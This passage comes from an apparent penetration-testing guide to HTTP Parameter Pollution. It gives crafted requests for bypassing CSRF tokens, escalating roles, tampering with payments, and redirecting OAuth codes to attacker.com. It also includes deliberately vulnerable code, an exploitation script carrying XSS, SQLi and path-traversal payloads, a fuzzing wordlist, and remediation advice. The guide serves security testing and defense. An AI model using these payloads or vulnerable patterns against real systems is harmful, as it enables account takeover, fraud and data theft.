```

```http [Express — HPP Middleware Bypass]
# If hpp middleware is installed, it takes first or last
# but doesn't handle nested objects
GET /api/data?filter[role]=user&filter[role]=admin HTTP/1.1
Host: target.com
```

```http [Express — RegExp Injection via Array]
GET /search?q=normal&q=.*admin.* HTTP/1.1
Host: target.com

# If app creates RegExp from parameter
# Array causes unexpected regex matching
```
::

::collapsible
---
label: "Django-Specific HPP Techniques"
---

```http [Django — QueryDict Behavior]
GET /search?q=safe&q=malicious HTTP/1.1
Host: target.com

# request.GET.get('q') → "malicious" (last value)
# request.GET.getlist('q') → ["safe", "malicious"] (all values)
```

```http [Django — Form Validation Bypass]
POST /register HTTP/1.1
Content-Type: application/x-www-form-urlencoded

username=newuser&is_staff=false&is_staff=true&is_superuser=true

# Django ModelForm may process last values
# If is_staff/is_superuser not excluded from form fields
```

```http [Django — URL Query vs POST Body]
POST /api/action?user_id=attacker HTTP/1.1
Content-Type: application/x-www-form-urlencoded

user_id=victim

# request.GET['user_id'] = "attacker"
# request.POST['user_id'] = "victim"
# Which does the view use?
```

```http [Django REST Framework — Nested Serializer]
POST /api/users/ HTTP/1.1
Content-Type: application/json

{
  "username": "newuser",
  "profile": {"role": "user"},
  "profile": {"role": "admin", "permissions": ["all"]}
}
```
::

::collapsible
---
label: "Ruby on Rails-Specific HPP Techniques"
---

```http [Rails — Strong Parameters Bypass]
POST /users HTTP/1.1
Content-Type: application/x-www-form-urlencoded

user[name]=John&user[role]=viewer&user[admin]=false&user[admin]=true

# If strong_parameters doesn't explicitly reject admin field
# params[:user][:admin] = "true"
```

```http [Rails — Mass Assignment via HPP]
POST /api/accounts HTTP/1.1
Content-Type: application/json

{
  "account": {
    "name": "Regular Account",
    "balance": 100,
    "account_type": "basic",
    "account_type": "unlimited"
  }
}
```

```http [Rails — Parameter Key Pollution]
POST /update HTTP/1.1
Content-Type: application/x-www-form-urlencoded

settings[theme]=dark&settings[notifications]=true&settings[role]=admin
```

```http [Rails — Routing Parameter Override]
GET /users/profile?id=attacker_id&id=victim_id HTTP/1.1
Host: target.com

# Rails params[:id] takes last value
```
::

### Token & CSRF Bypass via HPP

::collapsible
---
label: "CSRF and Anti-Forgery Token Bypass"
---

```http [CSRF Token — First vs Last Validation]
POST /transfer HTTP/1.1
Content-Type: application/x-www-form-urlencoded

csrf_token=ATTACKER_GUESSED_TOKEN&amount=10000&to=attacker&csrf_token=

# Some implementations check if token exists (not empty check on first)
# Or validate last occurrence which is empty (bypass)
```

```http [CSRF Token in URL vs Body]
POST /delete-account?csrf_token=valid_from_page HTTP/1.1
Content-Type: application/x-www-form-urlencoded

csrf_token=invalid_value&confirm=yes

# App checks URL token (valid) ✅
# But body contains the actual action parameters
```

```http [Multiple Token Parameters]
POST /sensitive-action HTTP/1.1
Content-Type: application/x-www-form-urlencoded

_token=invalid&authenticity_token=invalid&csrf=invalid&_token=valid_leaked_token

# Different frameworks look for different parameter names
# Pollution across multiple token parameter names
```

```http [CSRF Token Removal via HPP]
POST /action HTTP/1.1
Content-Type: application/x-www-form-urlencoded

param=value&_token[]=&_token=valid_token

# Array injection may confuse token validation
# Token comparison with array fails → bypass or error
```

```http [Double Submit Cookie Pollution]
POST /action HTTP/1.1
Cookie: csrf=legitimate_cookie_token
Content-Type: application/x-www-form-urlencoded

csrf=attacker_value&csrf=legitimate_cookie_token

# Body token compared to cookie
# If app takes last body value, matches cookie
```
::

---

## Privilege Escalation via HPP

::note
HPP enables privilege escalation by **manipulating the parameters that control access levels, user roles, and resource ownership**. The escalation is often direct — no need for separate exploits.
::

### Escalation Techniques

::card-group
  ::card
  ---
  title: "Role Parameter Override"
  icon: i-lucide-shield-alert
  ---
  Inject `role=admin` or `is_admin=true` as duplicate parameters. If the application uses the overridden value for session creation or authorization decisions, immediate admin access is achieved.
  ::

  ::card
  ---
  title: "User ID Substitution"
  icon: i-lucide-user-x
  ---
  Submit requests with your authorized user ID for authentication checks and the victim's user ID for data access. The authorization layer validates your ID while the data layer fetches the victim's data.
  ::

  ::card
  ---
  title: "OAuth Scope Escalation"
  icon: i-lucide-key
  ---
  Pollute OAuth authorization requests with duplicate `scope` parameters to request elevated permissions that bypass the consent screen or scope validation.
  ::

  ::card
  ---
  title: "API Key Tier Override"
  icon: i-lucide-crown
  ---
  Submit multiple API keys — a valid free-tier key and an expired/stolen premium key. If the application authenticates with one and authorizes with the other, tier restrictions are bypassed.
  ::

  ::card
  ---
  title: "Tenant Boundary Bypass"
  icon: i-lucide-building
  ---
  In multi-tenant applications, pollute `tenant_id` or `org_id` parameters to cross tenant boundaries and access other organizations' data.
  ::

  ::card
  ---
  title: "Feature Flag Manipulation"
  icon: i-lucide-toggle-right
  ---
  Override feature flag parameters to enable premium features, beta functionality, or admin-only capabilities on accounts that shouldn't have access.
  ::
::

### PrivEsc Attack Chains

::steps{level="4"}

#### Identify Privilege-Controlling Parameters

Intercept legitimate requests and identify parameters that control access:

```text
role, user_role, is_admin, admin, permission, access_level, 
user_type, account_type, plan, tier, group, privilege, 
is_staff, is_superuser, can_edit, can_delete, scope, 
org_id, tenant_id, team_id, department, clearance
```

#### Test Parameter Precedence

Determine which value the application uses when duplicated:

```http
POST /api/profile HTTP/1.1
Content-Type: application/x-www-form-urlencoded

role=user&role=admin
```

#### Exploit Parsing Discrepancy

If the authorization middleware checks one value and the business logic uses another:

```http
POST /api/admin/users HTTP/1.1
Content-Type: application/x-www-form-urlencoded

role=user&action=list_all_users&role=admin

# Middleware: role=user → authorized for basic access
# Handler: role=admin → executes admin action
```

#### Verify Escalated Access

Confirm the escalation by accessing admin-only functionality:

```http
GET /api/admin/dashboard?user_type=standard&user_type=administrator HTTP/1.1
Host: target.com
```

#### Maintain Persistence

If the role is stored in a session or JWT:

```http
POST /api/auth/refresh HTTP/1.1
Content-Type: application/json

{
  "refresh_token": "valid_token",
  "scope": "user",
  "scope": "admin"
}

# Refreshed JWT may contain elevated scope
```

::

---

## Real-World HPP Scenarios

### Scenario 1 — Password Reset Email Hijacking

::tabs
  :::tabs-item{icon="i-lucide-eye" label="Attack Flow"}

  The application sends password reset emails and accepts an `email` parameter:

  ```http
  POST /forgot-password HTTP/1.1
  Content-Type: application/x-www-form-urlencoded

  email=victim@target.com&email=attacker@evil.com
  ```

  **Possible Outcomes:**

  | Server Behavior | Result |
  |----------------|--------|
  | Uses **first** email | Reset sent to victim (attack fails) |
  | Uses **last** email | Reset sent to attacker (account takeover) |
  | Uses **both** emails | Reset sent to both (attacker gets token) |
  | **Concatenates** | Sent to `victim@target.com,attacker@evil.com` (both receive) |

  If the reset token is the same regardless of recipient, the attacker can use it on the target site.
  :::

  :::tabs-item{icon="i-lucide-code" label="Vulnerable Code"}
  ```python [views.py]
  @app.route('/forgot-password', methods=['POST'])
  def forgot_password():
      # VULNERABLE — Uses last email if framework returns last
      email = request.form.get('email')
      
      user = User.query.filter_by(email='victim@target.com').first()
      if user:
          token = generate_reset_token(user)
          # Sends to attacker's email but token is for victim's account
          send_reset_email(email, token)
          return "Reset link sent"
  ```

  The application queries the user by a hardcoded or session-based email but sends the reset to the **parameter** email. By polluting the email parameter, the attacker receives the victim's reset token.
  :::
::

### Scenario 2 — Payment Amount Manipulation

::tabs
  :::tabs-item{icon="i-lucide-eye" label="Attack Flow"}

  An e-commerce payment flow:

  ```http
  POST /api/checkout HTTP/1.1
  Content-Type: application/x-www-form-urlencoded

  product_id=LAPTOP&amount=1299.99&currency=USD&amount=1.00
  ```

  **Processing Chain:**

  1. **Payment Gateway Validation**: Reads `amount=1299.99` (first) — matches product price ✅
  2. **Payment Processing**: Reads `amount=1.00` (last) — charges $1.00 💀
  3. **Order Fulfillment**: Product shipped because payment was "validated"

  The attacker pays $1.00 for a $1,299.99 laptop.
  :::

  :::tabs-item{icon="i-lucide-code" label="Vulnerable Code"}
  ```javascript [checkout.js]
  app.post('/api/checkout', async (req, res) => {
    const productId = req.body.product_id;
    const product = await Product.findById(productId);
    
    // VULNERABLE — Different functions read different values
    // Validation uses first occurrence
    const validationAmount = parseFloat(req.query.amount || req.body.amount);
    
    if (validationAmount !== product.price) {
      return res.status(400).send('Price mismatch');
    }
    
    // Payment processing uses the raw body which may contain duplicates
    const paymentResult = await paymentGateway.charge({
      amount: req.body.amount, // May be last occurrence
      currency: req.body.currency
    });
    
    if (paymentResult.success) {
      await Order.create({ productId, status: 'paid' });
    }
  });
  ```
  :::
::

### Scenario 3 — OAuth Token Theft

::tabs
  :::tabs-item{icon="i-lucide-eye" label="Attack Flow"}

  OAuth 2.0 authorization flow with `redirect_uri` pollution:

  ```http
  GET /oauth/authorize?client_id=legit_app&response_type=code&redirect_uri=https://legitimate.com/callback&scope=read&redirect_uri=https://attacker.com/steal HTTP/1.1
  Host: auth.target.com
  ```

  1. **OAuth Server Validates**: `redirect_uri=https://legitimate.com/callback` matches registered URI ✅
  2. **OAuth Server Redirects**: Uses `redirect_uri=https://attacker.com/steal` (last value) 💀
  3. **Attacker Receives Auth Code**: `https://attacker.com/steal?code=AUTHORIZATION_CODE`
  4. **Attacker Exchanges Code**: Gets access token for victim's account

  :::

  :::tabs-item{icon="i-lucide-code" label="Vulnerable Code"}
  ```python [oauth_server.py]
  @app.route('/oauth/authorize')
  def authorize():
      client_id = request.args.get('client_id')
      redirect_uri = request.args.get('redirect_uri')  # Gets first OR last
      
      client = OAuthClient.query.get(client_id)
      
      # VULNERABLE — Validation and redirect may use different values
      # if framework returns different occurrences for different methods
      
      all_uris = request.args.getlist('redirect_uri')
      validated_uri = all_uris[0]  # Validate first
      actual_redirect = all_uris[-1]  # Redirect to last
      
      if validated_uri in client.registered_uris:
          code = generate_auth_code(current_user, client)
          return redirect(f"{actual_redirect}?code={code}")
      
      return "Invalid redirect_uri", 400
  ```
  :::
::

### Scenario 4 — Multi-Service Architecture Exploitation

::tabs
  :::tabs-item{icon="i-lucide-eye" label="Attack Flow"}

  A microservice architecture where an API gateway forwards requests to backend services:

  ```
  Client → [API Gateway (Nginx)] → [Auth Service (Flask)] → [Data Service (Express)]
  ```

  ```http
  GET /api/user/data?user_id=attacker_123&user_id=victim_456 HTTP/1.1
  Host: api.target.com
  Authorization: Bearer attacker_token
  ```

  | Service | Behavior | Value Used |
  |---------|----------|-----------|
  | **Nginx Gateway** | First value | `user_id=attacker_123` — routes correctly |
  | **Flask Auth Service** | First value | `user_id=attacker_123` — authorizes attacker ✅ |
  | **Express Data Service** | Array/Last | `user_id=victim_456` — returns victim's data 💀 |

  Each service in the chain uses a different parameter value. The attacker is authorized for their own ID but receives the victim's data.
  :::

  :::tabs-item{icon="i-lucide-code" label="Service Code"}
  ```python [auth_service.py (Flask)]
  @app.route('/verify')
  def verify_auth():
      user_id = request.args.get('user_id')  # First value: attacker_123
      token = request.headers.get('Authorization')
      
      if validate_token(token, user_id):  # Valid for attacker ✅
          return jsonify({"authorized": True}), 200
      return jsonify({"authorized": False}), 403
  ```

  ```javascript [data_service.js (Express)]
  app.get('/user/data', (req, res) => {
    // Array: ["attacker_123", "victim_456"]
    // Pop last or join — gets victim_456
    const userId = Array.isArray(req.query.user_id) 
      ? req.query.user_id[req.query.user_id.length - 1]  // Last value: victim_456
      : req.query.user_id;
    
    const data = db.getUserData(userId);  // Returns victim's data 💀
    res.json(data);
  });
  ```
  :::
::

---

## Automation & Tooling

### HPP Detection Script

::collapsible
---
label: "Python HPP Detection & Exploitation Script"
---

```python [hpp_scanner.py]
#!/usr/bin/env python3
"""
HTTP Parameter Pollution Scanner & Exploiter
Detects parameter precedence behavior and tests for HPP vulnerabilities.
"""

import requests
import sys
import json
from urllib.parse import urlencode, urlparse, parse_qs
import warnings
warnings.filterwarnings('ignore')

# === CONFIGURATION ===
TARGET_URL = "http://target.com/search"
METHOD = "GET"  # GET or POST
PARAM_NAME = "q"
TIMEOUT = 10

# === MARKER VALUES ===
FIRST_MARKER = "HPP_FIRST_VALUE"
LAST_MARKER = "HPP_LAST_VALUE"
MIDDLE_MARKER = "HPP_MIDDLE_VALUE"


def test_parameter_precedence(url, param, method="GET"):
    """Determine which parameter value the application uses."""
    print(f"\n[*] Testing parameter precedence for '{param}' on {url}")
    print(f"[*] Method: {method}\n")
    
    results = {}
    
    # Test 1: Two duplicate parameters
    if method == "GET":
        test_url = f"{url}?{param}={FIRST_MARKER}&{param}={LAST_MARKER}"
        response = requests.get(test_url, timeout=TIMEOUT, verify=False)
    else:
        data = f"{param}={FIRST_MARKER}&{param}={LAST_MARKER}"
        response = requests.post(url, data=data, timeout=TIMEOUT, verify=False)
    
    body = response.text
    
    if FIRST_MARKER in body and LAST_MARKER not in body:
        results['precedence'] = 'FIRST'
        print(f"[+] Precedence: FIRST value wins")
    elif LAST_MARKER in body and FIRST_MARKER not in body:
        results['precedence'] = 'LAST'
        print(f"[+] Precedence: LAST value wins")
    elif FIRST_MARKER in body and LAST_MARKER in body:
        if f"{FIRST_MARKER},{LAST_MARKER}" in body or f"{FIRST_MARKER}, {LAST_MARKER}" in body:
            results['precedence'] = 'CONCATENATED'
            print(f"[+] Precedence: CONCATENATED (comma-separated)")
        else:
            results['precedence'] = 'BOTH'
            print(f"[+] Precedence: BOTH values present")
    else:
        results['precedence'] = 'UNKNOWN'
        print(f"[-] Precedence: Could not determine")
    
    # Test 2: Three duplicate parameters
    if method == "GET":
        test_url = f"{url}?{param}={FIRST_MARKER}&{param}={MIDDLE_MARKER}&{param}={LAST_MARKER}"
        response = requests.get(test_url, timeout=TIMEOUT, verify=False)
    else:
        data = f"{param}={FIRST_MARKER}&{param}={MIDDLE_MARKER}&{param}={LAST_MARKER}"
        response = requests.post(url, data=data, timeout=TIMEOUT, verify=False)
    
    body = response.text
    results['three_param_response'] = body[:500]
    
    # Test 3: GET + POST conflict
    test_url = f"{url}?{param}=GET_VALUE"
    data = f"{param}=POST_VALUE"
    response = requests.post(test_url, data=data, timeout=TIMEOUT, verify=False)
    body = response.text
    
    if "GET_VALUE" in body and "POST_VALUE" not in body:
        results['get_post_priority'] = 'GET_WINS'
        print(f"[+] GET vs POST: GET parameter wins")
    elif "POST_VALUE" in body and "GET_VALUE" not in body:
        results['get_post_priority'] = 'POST_WINS'
        print(f"[+] GET vs POST: POST parameter wins")
    elif "GET_VALUE" in body and "POST_VALUE" in body:
        results['get_post_priority'] = 'BOTH_PRESENT'
        print(f"[+] GET vs POST: Both present")
    else:
        results['get_post_priority'] = 'UNKNOWN'
        print(f"[-] GET vs POST: Could not determine")
    
    # Test 4: Array syntax
    if method == "GET":
        test_url = f"{url}?{param}[]=ARRAY1&{param}[]=ARRAY2"
        response = requests.get(test_url, timeout=TIMEOUT, verify=False)
    else:
        data = f"{param}[]=ARRAY1&{param}[]=ARRAY2"
        response = requests.post(url, data=data, timeout=TIMEOUT, verify=False)
    
    body = response.text
    if "ARRAY1" in body or "ARRAY2" in body:
        results['array_syntax'] = 'SUPPORTED'
        print(f"[+] Array syntax: Supported")
    else:
        results['array_syntax'] = 'NOT_SUPPORTED'
        print(f"[-] Array syntax: Not supported or not reflected")
    
    return results


def test_hpp_bypass(url, param, payload, method="GET"):
    """Test HPP bypass techniques with a specific payload."""
    print(f"\n[*] Testing HPP bypass for payload: {payload[:50]}...")
    
    tests = [
        {
            "name": "Safe First, Malicious Last",
            "params": [(param, "safe_value"), (param, payload)]
        },
        {
            "name": "Malicious First, Safe Last",
            "params": [(param, payload), (param, "safe_value")]
        },
        {
            "name": "Safe-Malicious-Safe Sandwich",
            "params": [(param, "safe"), (param, payload), (param, "safe")]
        },
        {
            "name": "Mixed GET+POST (malicious in POST)",
            "params": "MIXED_POST",
            "get_value": "safe_value",
            "post_value": payload
        },
        {
            "name": "Mixed GET+POST (malicious in GET)",
            "params": "MIXED_GET",
            "get_value": payload,
            "post_value": "safe_value"
        },
        {
            "name": "Array Syntax",
            "params": [(f"{param}[]", "safe"), (f"{param}[]", payload)]
        }
    ]
    
    for test in tests:
        try:
            if test.get("params") == "MIXED_POST":
                test_url = f"{url}?{param}={test['get_value']}"
                data = f"{param}={test['post_value']}"
                response = requests.post(test_url, data=data, timeout=TIMEOUT, verify=False)
            elif test.get("params") == "MIXED_GET":
                test_url = f"{url}?{param}={test['get_value']}"
                data = f"{param}={test['post_value']}"
                response = requests.post(test_url, data=data, timeout=TIMEOUT, verify=False)
            elif method == "GET":
                query = "&".join([f"{k}={v}" for k, v in test["params"]])
                test_url = f"{url}?{query}"
                response = requests.get(test_url, timeout=TIMEOUT, verify=False)
            else:
                data = "&".join([f"{k}={v}" for k, v in test["params"]])
                response = requests.post(url, data=data, timeout=TIMEOUT, verify=False)
            
            if payload in response.text:
                print(f"  [+] {test['name']}: PAYLOAD REFLECTED ✅")
            else:
                print(f"  [-] {test['name']}: Payload not reflected")
                
        except Exception as e:
            print(f"  [!] {test['name']}: Error - {str(e)}")


def scan_all_parameters(url, method="GET"):
    """Scan all parameters in a URL for HPP vulnerability."""
    parsed = urlparse(url)
    params = parse_qs(parsed.query)
    
    print(f"\n{'='*60}")
    print(f"  HPP Scanner — Full Parameter Scan")
    print(f"{'='*60}")
    print(f"  Target: {url}")
    print(f"  Parameters found: {list(params.keys())}")
    
    for param_name in params.keys():
        results = test_parameter_precedence(
            f"{parsed.scheme}://{parsed.netloc}{parsed.path}",
            param_name,
            method
        )
        
        if results.get('precedence') in ['LAST', 'CONCATENATED', 'BOTH']:
            print(f"\n  [!] Parameter '{param_name}' is potentially vulnerable to HPP!")
            
            # Test common payloads
            test_payloads = [
                "<script>alert(1)</script>",
                "' OR '1'='1",
                "admin",
                "true",
                "../../../etc/passwd"
            ]
            
            for payload in test_payloads:
                test_hpp_bypass(
                    f"{parsed.scheme}://{parsed.netloc}{parsed.path}",
                    param_name,
                    payload,
                    method
                )


# === MAIN ===
if __name__ == "__main__":
    print("=" * 60)
    print("  HTTP Parameter Pollution Scanner")
    print("=" * 60)
    
    results = test_parameter_precedence(TARGET_URL, PARAM_NAME, METHOD)
    
    print(f"\n{'='*60}")
    print(f"  Results Summary")
    print(f"{'='*60}")
    for key, value in results.items():
        if key != 'three_param_response':
            print(f"  {key}: {value}")
    
    print(f"\n[*] Scan complete.")
```
::

### Burp Suite Intruder Wordlist

::collapsible
---
label: "HPP Fuzzing Wordlist"
---

```text [hpp_fuzz.txt]
# Basic HPP Tests
FUZZ&FUZZ=override
FUZZ&FUZZ=FUZZ
safe&q=<script>alert(1)</script>
1&id=2
user&role=admin
false&admin=true
low&privilege=high
read&scope=admin
standard&plan=premium
viewer&permission=write
10&amount=0.01
pending&status=approved
no&verified=yes
guest&username=admin
wrong&password=
100&quantity=99999

# Array Syntax
FUZZ[]&FUZZ[]=override
FUZZ[0]&FUZZ[1]=override

# GET + POST Conflict Markers
GET_VALUE
POST_VALUE

# Type Confusion
FUZZ&FUZZ[]=array_override
string_value&param[key]=object_override

# Common Privilege Parameters to Pollute
&role=admin
&is_admin=true
&admin=1
&user_type=administrator
&access_level=full
&permission=all
&is_staff=true
&is_superuser=true
&privilege=root
&group=administrators
&tier=enterprise
&plan=unlimited
&scope=admin
&debug=true
&internal=true
&test_mode=true
&bypass=true
```
::

---

## Attack Methodology

::steps{level="3"}

### Reconnaissance

Identify all parameters, their roles, and the technology stack.

    
  ::field{name="Parameter Mapping" type="string"}
  Intercept all requests with Burp Suite. Document every parameter name, its purpose, and where it appears (URL, body, headers, cookies).
  ::

  ::field{name="Technology Identification" type="string"}
  Identify web server, framework, WAF, CDN, and any middleware from response headers. Cross-reference with the parameter precedence table.
  ::

  ::field{name="Architecture Discovery" type="string"}
  Determine if multiple services process the request (API gateway → auth service → business logic → database). Each layer may parse parameters differently.
  ::

  ::field{name="Security Control Mapping" type="indicator"}
  Identify WAFs, input validation, CSRF protection, and rate limiting mechanisms. These are primary HPP bypass targets.
  ::

  ::field{name="Sensitive Parameters" type="string"}
  Identify parameters that control: authentication, authorization, pricing, quantities, user IDs, roles, permissions, email addresses, redirect URLs, and API keys.
  ::


### Parameter Precedence Testing

Test every parameter for handling behavior.

```http [Two-Value Test]
GET /endpoint?param=AAAA&param=BBBB HTTP/1.1
```

```http [Three-Value Test]
GET /endpoint?param=AAAA&param=BBBB&param=CCCC HTTP/1.1
```

```http [GET vs POST Test]
POST /endpoint?param=GET_VAL HTTP/1.1
Content-Type: application/x-www-form-urlencoded

param=POST_VAL
```

Document results in a precedence matrix.

### Vulnerability Identification

Based on precedence results, identify exploitable scenarios:

| Precedence | WAF Position | Exploit |
|-----------|-------------|---------|
| Last wins | WAF checks first | Malicious value last |
| First wins | WAF checks last | Malicious value first |
| Concatenated | WAF checks individually | Split payload across params |
| Array | WAF checks string | Type confusion, NoSQL injection |
| GET/POST conflict | WAF checks one source | Payload in other source |

### Exploitation

Craft HPP payloads targeting the identified discrepancy.

### Impact Verification

Confirm the business impact: unauthorized access, data leak, financial manipulation, or security bypass.

### Documentation

Record the full attack chain with request/response pairs showing the vulnerability.

::

---

## Remediation & Defense

::card-group
  ::card
  ---
  title: Reject Duplicate Parameters
  icon: i-lucide-shield-check
  ---
  Configure the application to **reject** requests containing duplicate parameter names with a `400 Bad Request` response. This is the strongest defense against HPP.

  ```python [Flask Example]
  @app.before_request
  def check_duplicate_params():
      for key in request.args:
          if len(request.args.getlist(key)) > 1:
              abort(400, "Duplicate parameters not allowed")
  ```
  ::

  ::card
  ---
  title: Use Explicit Parameter Access
  icon: i-lucide-code
  ---
  Always use **specific** parameter access methods instead of merged/combined accessors:

  ```php
  // Use $_POST['param'] not $_REQUEST['param']
  // Use specific methods, not combined ones
  ```

  ```python
  # Use request.form.get() not request.values.get()
  ```
  ::

  ::card
  ---
  title: Consistent Parsing Across Layers
  icon: i-lucide-layers
  ---
  Ensure WAF, reverse proxy, API gateway, and application all use the **same parameter precedence** rules. Test with duplicate parameters during security configuration.
  ::

  ::card
  ---
  title: Whitelist Input Validation
  icon: i-lucide-check-circle
  ---
  Validate parameter values against strict whitelists. Numeric parameters should accept only digits. Role parameters should match a predefined set of allowed values.
  ::

  ::card
  ---
  title: Server-Side Value Authority
  icon: i-lucide-server
  ---
  Never trust client-supplied values for **prices, quantities, roles, permissions, or user IDs**. Always fetch these values from the **server-side session or database**.

  ```python
  # WRONG: Use client-supplied price
  price = request.form.get('price')
  
  # RIGHT: Fetch price from database
  product = Product.query.get(product_id)
  price = product.price
  ```
  ::

  ::card
  ---
  title: HPP Middleware
  icon: i-lucide-filter
  ---
  Use framework-specific HPP protection middleware:

  ```javascript
  // Express.js — hpp middleware
  const hpp = require('hpp');
  app.use(hpp());
  ```

  This middleware takes only the last parameter value and discards duplicates.
  ::

  ::card
  ---
  title: WAF Parameter Normalization
  icon: i-lucide-brick-wall
  ---
  Configure WAFs to **normalize** duplicate parameters before inspection. The WAF should inspect the **same value** that the application will process.
  ::

  ::card
  ---
  title: URL Construction Security
  icon: i-lucide-link
  ---
  When constructing URLs with user input, use proper URL encoding and parameterized URL builders instead of string concatenation. Reject input containing `&` and `=` characters in parameter values.
  ::

  ::card
  ---
  title: JSON Schema Validation
  icon: i-lucide-file-json
  ---
  For JSON APIs, use strict JSON schema validation that rejects documents with duplicate keys. Most JSON parsers silently accept duplicate keys — configure them to reject or throw errors.
  ::

  ::card
  ---
  title: OAuth Security
  icon: i-lucide-lock
  ---
  Implement **exact match** validation for `redirect_uri` — compare the full URI including query parameters. Reject authorization requests containing duplicate `redirect_uri`, `scope`, or `client_id` parameters.
  ::
::

---

## Tools

::card-group
  ::card
  ---
  title: Burp Suite
  icon: i-lucide-bug
  to: https://portswigger.net/burp
  target: _blank
  ---
  Intercept and duplicate parameters in Repeater. Use Intruder for automated HPP testing with the fuzzing wordlist. Comparer for response differential analysis.
  ::

  ::card
  ---
  title: Param Miner
  icon: i-lucide-search
  to: https://portswigger.net/bappstore/17d2949a985c4b7ca092728dba871943
  target: _blank
  ---
  Burp extension that discovers hidden parameters. Identifies parameters the application processes but doesn't expose — prime HPP targets.
  ::

  ::card
  ---
  title: Arjun
  icon: i-lucide-radar
  to: https://github.com/s0md3v/Arjun
  target: _blank
  ---
  HTTP parameter discovery tool. Finds hidden and undocumented parameters that can be polluted for access control bypass.
  ::

  ::card
  ---
  title: ParamSpider
  icon: i-lucide-spider
  to: https://github.com/devanshbatham/ParamSpider
  target: _blank
  ---
  Extracts parameters from web archives and crawls. Builds comprehensive parameter lists for HPP testing.
  ::

  ::card
  ---
  title: ffuf
  icon: i-lucide-zap
  to: https://github.com/ffuf/ffuf
  target: _blank
  ---
  Fast web fuzzer for testing parameter pollution payloads. Use `FUZZ` markers with duplicate parameter wordlists.
  ::

  ::card
  ---
  title: HTTPolice
  icon: i-lucide-file-check
  to: https://github.com/vfaronov/httpolice
  target: _blank
  ---
  HTTP lint tool that detects protocol-level issues including duplicate headers and malformed parameters.
  ::

  ::card
  ---
  title: nuclei
  icon: i-lucide-atom
  to: https://github.com/projectdiscovery/nuclei
  target: _blank
  ---
  Template-based vulnerability scanner with HPP detection templates. Can test parameter precedence across multiple targets at scale.
  ::

  ::card
  ---
  title: Custom Scripts
  icon: i-lucide-terminal
  to: https://github.com/swisskyrepo/PayloadsAllTheThings
  target: _blank
  ---
  Use the Python HPP scanner provided above or build custom scripts targeting specific application logic and parameter handling quirks.
  ::
::